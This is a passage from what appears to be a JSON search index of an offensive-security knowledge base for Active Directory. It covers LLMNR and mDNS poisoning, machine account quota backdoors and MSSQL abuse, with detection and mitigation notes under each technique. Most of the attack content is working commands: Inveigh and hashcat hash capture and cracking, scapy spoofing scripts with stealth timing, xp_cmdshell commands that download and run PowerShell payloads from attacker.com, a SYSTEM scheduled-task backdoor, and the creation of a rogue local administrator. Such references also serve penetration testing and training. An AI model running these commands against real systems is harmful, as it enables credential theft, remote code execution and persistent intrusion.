Inveigh","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#powershell-version","title":"PowerShell Version","text":"<pre><code>Import-Module .\\Inveigh.ps1\nInvoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#c-version-inveighzero","title":"C# Version (InveighZero)","text":"<pre><code>.\\Inveigh.exe\n</code></pre> <p>You can view unique captured hashes by typing: <pre><code>GET NTLMV2UNIQUE\n</code></pre></p> <p>View captured usernames: <pre><code>GET NTLMV2USERNAMES\n</code></pre></p>","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#abuse-options","title":"Abuse Options","text":"<p>Once you've captured Net-NTLMv2 hashes, you have two primary options:</p> <ol> <li> <p>Crack the hashes offline using tools like Hashcat or John the Ripper to recover plaintext passwords</p> <ol> <li>[[hash_cracking]]</li> </ol> </li> <li> <p>Relay the authentication attempt to other services using NTLM Relay attacks (see relay attacks technique)</p> <ol> <li>[[relay_attacks]]</li> </ol> </li> </ol>","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#hash-cracking-with-hashcat","title":"Hash Cracking with Hashcat","text":"<pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#detection","title":"Detection","text":"<ul> <li>Monitor network traffic for unusual LLMNR and NBT-NS responses</li> <li>Look for authentication attempts from unexpected sources</li> <li>Use honeypot hostnames that trigger alerts when resolved</li> </ul>","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/llmnr_poisoning/#mitigation","title":"Mitigation","text":"<ol> <li>Disable LLMNR: </li> <li> <p>Via Group Policy: Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client &gt; \"Turn OFF multicast Name Resolution\"</p> </li> <li> <p>Disable NBT-NS:</p> </li> <li>Navigate to Network Connections &gt; Network Adapter Properties &gt; TCP/IPv4 Properties &gt; Advanced tab &gt; WINS tab</li> <li>Select \"Disable NetBios over TCP/IP\"</li> </ol> <p>If you cannot disable these protocols:</p> <ul> <li>Implement Network Access Control (NAC) to restrict unauthorized devices</li> <li>Require strong passwords (14+ characters with complexity) to make hash cracking difficult</li> <li>Segment networks to limit the scope of potential attacks</li> <li>Use SMB signing to prevent NTLM relay attacks</li> <li>Consider implementing additional authentication factors</li> </ul>","tags":["#type/technique","#tactic/TA0001","#technique/T1557.001","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#os/windows","#tool/responder","#tool/inveigh","#tool/hashcat","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/mDNS/","title":"mDNS","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#technique","title":"Technique","text":"<p>Multicast DNS (mDNS) is a protocol that resolves hostnames to IP addresses within small networks without a local name server. Operating on the link-local scope (typically 169.254.0.0/16 for IPv4 or fe80::/10 for IPv6), mDNS uses IP multicast addressing to enable devices to resolve .local domain names and discover network services.</p> <p>mDNS operates by multicasting queries to the reserved address 224.0.0.251 on UDP port 5353. When a device sees a query for its own name, it multicasts a response with its IP address. This makes mDNS useful for local network discovery but also introduces security concerns as it can be abused for reconnaissance and man-in-the-middle attacks.</p> <p>Often implemented alongside DNS Service Discovery (DNS-SD), mDNS allows attackers to discover available services, potentially revealing sensitive information about the network infrastructure, and can be leveraged for spoofing and poisoning attacks.</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Network access to the target environment where mDNS is used.</p> <p>System State: mDNS implementation must be active in the target environment: - Windows: Enabled by default in modern versions - macOS: Enabled by default (Bonjour) - Linux: Often enabled via Avahi daemon - IoT devices: Commonly enabled for easy discovery</p> <p>Information: Understanding of basic networking concepts and the mDNS protocol.</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#considerations","title":"Considerations","text":"<p>Impact</p> <p>mDNS can be leveraged for network reconnaissance, information gathering, spoofing, and poisoning attacks. Since it operates on a local network level without authentication mechanisms, it presents a significant attack surface for insider threats or attackers who have already gained initial access to the network.</p> <p>OPSEC</p> <ul> <li> <p>Network Visibility: mDNS queries and responses generate traffic that may be visible to network monitoring tools.</p> </li> <li> <p>Response Rate Limiting: Some modern mDNS implementations have throttling mechanisms to prevent flooding attacks, which may limit the effectiveness of aggressive scanning.</p> </li> <li> <p>Network Segmentation: mDNS is typically constrained to broadcast domains, meaning Layer 3 boundaries (routers) will usually block this traffic unless specifically configured to forward it.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#passive-discovery","title":"Passive Discovery","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#tcpdump","title":"tcpdump","text":"<p>Capture mDNS traffic:</p> <pre><code>sudo tcpdump -i eth0 udp port 5353 -vv\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#wireshark","title":"Wireshark","text":"<p>Filter for mDNS traffic:</p> <pre><code>udp.port == 5353\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#active-discovery","title":"Active Discovery","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#dns-sd-macoslinux","title":"dns-sd (macOS/Linux)","text":"<p>Query for available services:</p> <pre><code>dns-sd -B _services._dns-sd._udp local\n</code></pre> <p>Enumerate a specific service type:</p> <pre><code>dns-sd -B _http._tcp local\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#mdns-scan","title":"mDNS-scan","text":"<p>Scan network for mDNS-enabled devices:</p> <pre><code>mdns-scan\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#mdns-spoofing","title":"mDNS Spoofing","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#responder","title":"Responder","text":"<p>Configure and run Responder to intercept mDNS queries:</p> <pre><code>sudo responder -I eth0 -wF\n</code></pre> <p>For more targeted attacks, edit the Responder.conf file to enable specific mDNS spoofing:</p> <pre><code>nano /etc/responder/Responder.conf\n# Set mDNS = On\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#dnschef","title":"dnschef","text":"<p>Run dnschef to intercept and manipulate mDNS queries:</p> <pre><code>sudo dnschef --interface 0.0.0.0 --port 5353 --fakeip 192.168.1.100 --fakedomains *.local\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#mdns-poisoning","title":"mDNS Poisoning","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#custom-python-script","title":"Custom Python Script","text":"<p>Using scapy to forge mDNS responses:</p> <pre><code>from scapy.all import *\n\ndef send_fake_mdns_response():\n    # Create Ethernet header\n    eth = Ether()\n\n    # Create IP header\n    ip = IP(dst=\"224.0.0.251\")\n\n    # Create UDP header\n    udp = UDP(sport=5353, dport=5353)\n\n    # Create DNS header and payload\n    dns = DNS(\n        id=0,\n        qr=1,  # This is a response\n        aa=1,  # Authoritative Answer\n        rd=0,  # Recursion Desired\n        ra=0,  # Recursion Available\n        z=0,  # Reserved\n        ad=0,  # Authentic Data\n        cd=0,  # Checking Disabled\n        qdcount=1,\n        ancount=1,\n        nscount=0,\n        arcount=0,\n        qd=DNSQR(qname=\"target-device.local\", qtype=\"A\", qclass=\"IN\"),\n        an=DNSRR(rrname=\"target-device.local\", type=\"A\", rclass=\"IN\", ttl=120, rdata=\"192.168.1.100\")\n    )\n\n    # Assemble packet\n    pkt = eth / ip / udp / dns\n\n    # Send packet\n    sendp(pkt, iface=\"eth0\", loop=0, verbose=1)\n\nsend_fake_mdns_response()\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#avahi-linux","title":"Avahi (Linux)","text":"<p>Create a malicious service advertisement:</p> <pre><code>avahi-publish -a \"target-device.local\" 192.168.1.100 --ttl 120\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#defense-evasion","title":"Defense Evasion","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#targeted-mdns-queries","title":"Targeted mDNS Queries","text":"<p>To avoid detection by network monitoring, limit queries to specific hostnames:</p> <pre><code>dig @224.0.0.251 -p 5353 +short specific-host.local\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#low-and-slow-approach","title":"Low-and-Slow Approach","text":"<p>Implement timing delays between mDNS requests:</p> <pre><code>import time\nfrom scapy.all import *\n\ndef stealthy_mdns_scan(targets):\n    for target in targets:\n        pkt = IP(dst=\"224.0.0.251\")/UDP(sport=5353, dport=5353)/DNS(rd=0, qd=DNSQR(qname=target+\".local\", qtype=\"A\"))\n        send(pkt, verbose=0)\n        time.sleep(5)  # Wait 5 seconds between queries\n\nstealthy_mdns_scan([\"printer\", \"fileserver\", \"nas\"])\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#detection","title":"Detection","text":"<ul> <li>Monitor for unusual mDNS traffic volumes or patterns</li> <li>Look for mDNS queries for non-existent services</li> <li>Deploy network monitoring tools that can detect mDNS spoofing attempts</li> <li>Watch for duplicate responses to the same mDNS query with different answers</li> <li>Monitor for devices responding to mDNS queries that they shouldn't be answering</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/mDNS/#mitigation","title":"Mitigation","text":"<ul> <li>Disable mDNS: If not needed, disable mDNS services on endpoints.</li> </ul> <p>Windows:   <pre><code>Set-Service \"DNSCache\" -StartupType Disabled\nStop-Service \"DNSCache\"\n</code></pre></p> <p>Linux:   <pre><code>sudo systemctl stop avahi-daemon\nsudo systemctl disable avahi-daemon\n</code></pre></p> <ul> <li> <p>Network Segmentation: Implement proper network segmentation to contain mDNS traffic to necessary segments only.</p> </li> <li> <p>Firewall Rules: Block mDNS traffic (UDP port 5353) at network boundaries and between security zones.</p> </li> <li> <p>mDNS Reflection Prevention: Configure networks to prevent mDNS reflection attacks by implementing BCP38 filtering.</p> </li> <li> <p>Use Secure Alternatives: Where possible, replace mDNS with more secure service discovery mechanisms.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1557","#stage/discovery","#stage/lateral-movement","#os/windows","#os/linux","#os/macos","#tool/responder","#tool/dnschef","#protocol/dns"]},{"location":"Active%20Directory/flat/machine_account_quota/","title":"Machine account quota","text":"","tags":["#type/technique","#tactic/TA0003","#technique/T1136.001","#stage/persistence","#os/windows","#tool/powermad","#tool/impacket"]},{"location":"Active%20Directory/flat/machine_account_quota/#technique","title":"Technique","text":"<p>The Machine Account Quota (ms-DS-MachineAccountQuota) is an Active Directory attribute that allows non-privileged users to create machine accounts up to the specified quota (default: 10). Attackers can abuse this to create persistent backdoors in the domain.</p>","tags":["#type/technique","#tactic/TA0003","#technique/T1136.001","#stage/persistence","#os/windows","#tool/powermad","#tool/impacket"]},{"location":"Active%20Directory/flat/machine_account_quota/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Any domain user account.</p> <p>System State: Default Active Directory configuration (quota &gt; 0).</p> <p>Information: Domain controller name or IP.</p>","tags":["#type/technique","#tactic/TA0003","#technique/T1136.001","#stage/persistence","#os/windows","#tool/powermad","#tool/impacket"]},{"location":"Active%20Directory/flat/machine_account_quota/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0003","#technique/T1136.001","#stage/persistence","#os/windows","#tool/powermad","#tool/impacket"]},{"location":"Active%20Directory/flat/machine_account_quota/#windows-powerview","title":"Windows (PowerView)","text":"<pre><code># Check current quota value\nGet-DomainObject -Identity \"DC=domain,DC=local\" -Properties ms-DS-MachineAccountQuota\n\n# Create new machine account\nNew-MachineAccount -MachineAccount Backdoor -Password $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force) -Domain domain.local -DomainController DC1.domain.local\n\n# Verify creation\nGet-ADComputer -Identity Backdoor\n</code></pre>","tags":["#type/technique","#tactic/TA0003","#technique/T1136.001","#stage/persistence","#os/windows","#tool/powermad","#tool/impacket"]},{"location":"Active%20Directory/flat/machine_account_quota/#linux-netexec","title":"Linux (NetExec)","text":"<pre><code># Check current quota\nnxc ldap DC_IP -u user -p password -M maq\n\n# Create machine account\nnxcldap DC_IP -u user -p password -M addcomputer -o COMPUTER_NAME=BACKDOOR -o PASSWORD=P@ssw0rd!\n\n# Verify creation\nnxc ldap DC_IP -u user -p password -X '(&amp;(objectClass=computer)(name=BACKDOOR*))' base\n</code></pre>","tags":["#type/technique","#tactic/TA0003","#technique/T1136.001","#stage/persistence","#os/windows","#tool/powermad","#tool/impacket"]},{"location":"Active%20Directory/flat/machine_account_quota/#linux-ldapsearch","title":"Linux (ldapsearch)","text":"<pre><code># Check quota value\nldapsearch -H ldap://DC_IP -x -D 'user@domain.local' -w 'password' -b 'DC=domain,DC=local' '(objectClass=domain)' ms-DS-MachineAccountQuota\n\n# Verify machine account\nldapsearch -H ldap://DC_IP -x -D 'user@domain.local' -w 'password' -b 'DC=domain,DC=local' '(&amp;(objectClass=computer)(name=BACKDOOR*))' name\n</code></pre>","tags":["#type/technique","#tactic/TA0003","#technique/T1136.001","#stage/persistence","#os/windows","#tool/powermad","#tool/impacket"]},{"location":"Active%20Directory/flat/machine_account_quota/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0003","#technique/T1136.001","#stage/persistence","#os/windows","#tool/powermad","#tool/impacket"]},{"location":"Active%20Directory/flat/machine_account_quota/#detection","title":"Detection","text":"<ul> <li>Monitor for <code>Create/Modify Computer</code> events (4741-4743) from non-admin users</li> <li>Look for unusual machine account creations</li> <li>Monitor for LDAP queries checking the MachineAccountQuota attribute</li> </ul>","tags":["#type/technique","#tactic/TA0003","#technique/T1136.001","#stage/persistence","#os/windows","#tool/powermad","#tool/impacket"]},{"location":"Active%20Directory/flat/machine_account_quota/#mitigation","title":"Mitigation","text":"<ul> <li>Set <code>ms-DS-MachineAccountQuota</code> to 0   <pre><code>Set-ADDomain -Identity domain.local -Replace @{\"ms-DS-MachineAccountQuota\"=\"0\"}\n</code></pre></li> <li>Monitor and alert on computer account creation</li> <li>Implement privileged access workstations (PAWs)</li> <li>Use LAPS for local admin password management</li> </ul>","tags":["#type/technique","#tactic/TA0003","#technique/T1136.001","#stage/persistence","#os/windows","#tool/powermad","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/","title":"Mssql abuse","text":"","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#technique","title":"Technique","text":"<p>Microsoft SQL Server (MSSQL) abuse involves leveraging SQL Server instances for lateral movement, privilege escalation, and persistence within an Active Directory environment. SQL Servers often run with high privileges and have features that can be exploited to execute operating system commands, access sensitive data, or pivot to other systems.</p> <p>These servers frequently operate using service accounts with domain privileges or are installed with excessive permissions, making them high-value targets for attackers. Once an attacker gains access to a SQL Server, various techniques can be used to escalate privileges and move laterally through the network.</p>","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#prerequisites","title":"Prerequisites","text":"<p>Access Level:  - Valid SQL Server credentials (SQL authentication or Windows authentication) - Network access to the SQL Server instance (typically port 1433 or custom ports)</p> <p>System State: - Target environment must have MSSQL Server instances - Ideally, extended stored procedures like xp_cmdshell are available or can be enabled</p>","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#identification","title":"Identification","text":"","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#discovering-sql-server-instances","title":"Discovering SQL Server Instances","text":"<p>Using PowerUpSQL (PowerShell): <pre><code># Import the module\nImport-Module .\\PowerUpSQL.ps1\n\n# Discover SQL instances in the domain\nGet-SQLInstanceDomain\n\n# Get detailed information about discovered instances\nGet-SQLInstanceDomain | Get-SQLServerInfo -Verbose\n</code></pre></p> <p>Using other methods: <pre><code># Port scanning\nnmap -p 1433 10.0.0.0/24\n\n# LDAP query for SQL Server SPNs\nldapsearch -x -h dc01.domain.local -D \"cn=user,dc=domain,dc=local\" -w \"password\" -b \"dc=domain,dc=local\" \"servicePrincipalName=MSSQL*\"\n</code></pre></p>","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#connection","title":"Connection","text":"","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#connecting-to-sql-server","title":"Connecting to SQL Server","text":"<p>From Windows using PowerUpSQL: <pre><code># Using Windows authentication\nGet-SQLQuery -Verbose -Instance \"SQLSERVER01.domain.local,1433\" -query \"SELECT @@version\"\n\n# Using SQL authentication\nGet-SQLQuery -Verbose -Instance \"SQLSERVER01.domain.local,1433\" -username \"sa\" -password \"Password123\" -query \"SELECT @@version\"\n\n# Using Windows authentication with specific credentials\nGet-SQLQuery -Verbose -Instance \"SQLSERVER01.domain.local,1433\" -username \"domain.local\\user\" -password \"Password123\" -query \"SELECT @@version\"\n</code></pre></p> <p>From Linux using Impacket: <pre><code># Using Windows authentication\nimpacket-mssqlclient domain.local/user:password@SQLSERVER01.domain.local -windows-auth\n\n# Using SQL authentication\nimpacket-mssqlclient sa:password@SQLSERVER01.domain.local\n</code></pre></p>","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#exploitation","title":"Exploitation","text":"","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#command-execution-via-xp_cmdshell","title":"Command Execution via xp_cmdshell","text":"<p>The xp_cmdshell extended stored procedure allows execution of operating system commands through SQL Server:</p> <p>Enable xp_cmdshell if disabled: <pre><code>-- Check if xp_cmdshell is enabled\nSELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'\n\n-- Enable xp_cmdshell\nEXEC sp_configure 'show advanced options', 1\nRECONFIGURE\nEXEC sp_configure 'xp_cmdshell', 1\nRECONFIGURE\n</code></pre></p> <p>Execute commands: <pre><code>-- Basic command execution\nEXEC xp_cmdshell 'whoami'\nEXEC xp_cmdshell 'whoami /priv'\nEXEC xp_cmdshell 'net user'\n\n-- Execution with Impacket\nSQL&gt; enable_xp_cmdshell\nSQL&gt; xp_cmdshell whoami /priv\n</code></pre></p>","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#data-exfiltration","title":"Data Exfiltration","text":"<p>Access sensitive information from databases: <pre><code>-- List all databases\nSELECT name FROM master.dbo.sysdatabases\n\n-- List all tables in a database\nSELECT table_name FROM [database_name].information_schema.tables\n\n-- Extract data from a specific table\nSELECT * FROM [database_name].[schema_name].[table_name]\n</code></pre></p>","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#lateral-movement-techniques","title":"Lateral Movement Techniques","text":"<p>Deploy and execute payload: <pre><code>-- Write a file to disk\nEXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/payload.ps1\") &gt; C:\\Windows\\Temp\\payload.ps1'\n\n-- Execute the payload\nEXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\payload.ps1'\n</code></pre></p> <p>Create and add user to local administrators: <pre><code>EXEC xp_cmdshell 'net user hacker Password123 /add'\nEXEC xp_cmdshell 'net localgroup administrators hacker /add'\n</code></pre></p> <p>Scheduled tasks: <pre><code>EXEC xp_cmdshell 'schtasks /create /tn \"Maintenance\" /tr \"powershell -c IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/backdoor.ps1'')\" /sc ONCE /st 23:00 /ru \"SYSTEM\"'\n</code></pre></p>","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#linked-servers-abuse","title":"Linked Servers Abuse","text":"<p>SQL Server linked servers allow for executing queries across different database servers:</p> <pre><code>-- List linked servers\nEXEC sp_linkedservers\n\n-- Execute commands on linked servers\nEXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServer]\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#clr-integration","title":"CLR Integration","text":"<p>Custom CLR (Common Language Runtime) assemblies can be used for execution:</p> <pre><code>-- Enable CLR integration\nEXEC sp_configure 'clr enabled', 1\nRECONFIGURE\n\n-- Create malicious assembly (simplified example)\nCREATE ASSEMBLY malicious FROM 0x4D5A90000...\nCREATE PROCEDURE ExecuteCmd AS EXTERNAL NAME malicious.StoredProcedures.ExecuteCmd\nEXEC ExecuteCmd 'whoami'\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#detection","title":"Detection","text":"<ul> <li>Monitor for SQL Server authentication events, particularly from unusual sources</li> <li>Look for configuration changes to extended stored procedures, especially xp_cmdshell</li> <li>Audit for creation of SQL Server objects like assemblies, stored procedures, and triggers</li> <li>Monitor for unusual query patterns or commands executed via SQL Server</li> <li>Watch for file system activity initiated by the SQL Server service account</li> </ul>","tags":["#type/technique","#tactic/TA0008","#tactic/TA0004","#technique/T1078.002","#technique/T1059.003","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#service/mssql","#tool/powerupsql","#tool/impacket"]},{"location":"Active%20Directory/flat/mssql_abuse/#mitigation","title":"Mitigation","text":"<ul> <li>Disable or restrict access to dangerous extended stored procedures like xp_cmdshell</li> <li>Implement the principle of least privilege for SQL Server service accounts</li> <li>Use contained databases and contained authentication to avoid lateral movement</li> <li>Regularly audit SQL Server permissions and roles</li> <li>Enable SQL Server auditing to log suspicious activities</li> <li>Use Windows Defender Application Control to restrict SQL Server's ability to execute code</li> <li>Keep SQL Server and Windows updated with the latest security patches</li> <li>Implement network segmentation to limit connectivity to and from SQL Servers</li> <li>Use Always Encrypted for sensitive data to prevent unauthorized data access</li> 